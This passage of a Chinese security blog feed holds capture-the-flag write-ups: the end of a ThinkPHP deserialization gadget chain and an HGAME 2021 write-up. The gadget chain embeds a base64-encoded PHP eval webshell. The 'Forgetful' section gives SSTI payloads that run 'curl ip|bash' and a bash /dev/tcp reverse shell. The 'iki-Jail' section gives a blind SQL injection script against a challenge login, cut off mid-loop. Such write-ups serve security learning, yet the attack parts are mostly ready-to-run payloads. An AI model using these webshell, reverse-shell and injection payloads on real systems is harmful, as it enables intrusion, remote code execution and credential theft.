        &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$handler&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$handle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;handler&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$handle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//$handle-&amp;gt;think\cache\driver\File
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think\cache\driver&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;File&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$options&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$tag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;options&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;
                &lt;span class=&#34;s1&#34;&gt;&amp;#39;expire&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3600&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
                &lt;span class=&#34;s1&#34;&gt;&amp;#39;cache_subdir&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
                &lt;span class=&#34;s1&#34;&gt;&amp;#39;prefix&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
                &lt;span class=&#34;s1&#34;&gt;&amp;#39;path&amp;#39;&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
                &lt;span class=&#34;s1&#34;&gt;&amp;#39;data_compress&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;tag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;xxx&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$Memcached&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think\session\driver\Memcached&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;\think\cache\driver\File&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$Output&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think\console\Output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$Memcached&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$model&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think\db\Query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$Output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$HasOne&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think\model\relation\HasOne&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$model&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$window&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think\process\pipes\Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think\model\Pivot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$Output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$HasOne&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;base64_encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;小结-1&#34;&gt;小结&lt;/h3&gt;
&lt;p&gt;在挖掘这种大型框架的反序列化链子的时候，代码量巨大，我们要在其中寻找：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;危险函数（回调，读写文件，命令执行等）&lt;/li&gt;
&lt;li&gt;同名方法（往往可以作为跳板）&lt;/li&gt;
&lt;li&gt;可控参数（越多越好）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;另外有一篇文章总结的挺不错https://xz.aliyun.com/t/8082&lt;/p&gt;
</description>
        </item>
        <item>
        <title>HGAME 2021 Writeup</title>
        <link>https://anthem-whisper.github.io/p/hgame-2021-writeup/</link>
        <pubDate>Sat, 20 Feb 2021 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/hgame-2021-writeup/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228093852.png" alt="Featured image of post HGAME 2021 Writeup" /&gt;&lt;h2 id=&#34;level---week3&#34;&gt;Level - Week3&lt;/h2&gt;
&lt;h3 id=&#34;forgetful&#34;&gt;Forgetful&lt;/h3&gt;
&lt;p&gt;考点：简单python-SSTI&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210214230828.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;题目是一个记事本，添加描述的时候存在SSTI，在查看页面可以看到SSTI已经成功了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210214230954.png&#34; alt=&#34;image-20210214230953251&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;最为常规的payload：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{{[].__class__.__mro__[1].__subclasses__()}}
{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;ls /&#39;).read()}}
{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;curl ip|bash&#39;).read()}}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;因为命令执行处有waf，所以可以选择直接弹shell：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nc -lvnp 8888
bash -i &amp;gt;&amp;amp; /dev/tcp/ip/8888 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;姿势还是比较常规；&lt;/p&gt;
&lt;p&gt;分享一个从&lt;code&gt;[].__class__.__mro__[1].__subclasses__()&lt;/code&gt;查找模块位置的脚本：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#python 3&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;re&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[回显内容]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;

&lt;span class=&#34;nb&#34;&gt;list&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;re&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)):&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;catch_warnings&amp;#39;&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]:&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;iki-jail&#34;&gt;iki-Jail&lt;/h3&gt;
&lt;p&gt;考点：MySQL注入，单引号逃逸&lt;/p&gt;
&lt;p&gt;熟悉的登录框，熟悉的sql注入&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215130850.png&#34; alt=&#34;image-20210215130849132&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;发现用户字段必须要邮箱才可以，而且如果开了Burp抓包之后会出现一些问题，导致Ajax不能工作。&lt;/p&gt;
&lt;p&gt;于是直接使用bp对&lt;code&gt;login.php&lt;/code&gt;发包；&lt;/p&gt;
&lt;p&gt;进行了简单的fuzz，过滤如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215131112.png&#34; alt=&#34;image-20210215131110567&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;由单双引号过滤想到了&lt;code&gt;\&lt;/code&gt;逃逸单引号，当我们用户名输入&lt;code&gt;admin\&lt;/code&gt;的时候，语句变成了：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;admin\&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;xxx&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;那么&lt;code&gt;xxx&lt;/code&gt;就变成了sql语句执行，造成了注入；&lt;/p&gt;
&lt;p&gt;结果发现只能延时注入：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215131035.png&#34; alt=&#34;image-20210215131033385&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#python3,wh1sper&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;time&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;host&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;https://jailbreak.liki.link/login.php&amp;#39;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;mid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;top&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)(&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;top&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;transToHex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;0x&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0x&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;sqli&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;top&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;126&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;bot&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;top&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;babyselect&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;(database())&amp;#39;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#week3sqli&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;babyselect&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;(select group_concat(table_name) from information_schema.TABLES where table_schema like database())&amp;#34;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#u5ers&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;babyselect&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;(select group_concat(column_name) from information_schema.columns where table_name like 0x7535657273)&amp;#34;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#usern@me,p@ssword&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;babyselect&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;(select `p@ssword` from week3sqli.u5ers)&amp;#34;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#sOme7hiNgseCretw4sHidd3n&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;babyselect&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;(select `usern@me` from week3sqli.u5ers)&amp;#34;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#admin&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;^(if((ascii(substr({},{},1))&amp;gt;{}),1,sleep(2)))#&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;babyselect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;top&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;admin&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
                &lt;span class=&#34;s2&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/**/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
                &lt;span class=&#34;c1&#34;&gt;#^(if((ascii(1)&amp;gt;55),sleep(3),sleep(3)))#这个确实延时成功了&lt;/span&gt;
            &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;start&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
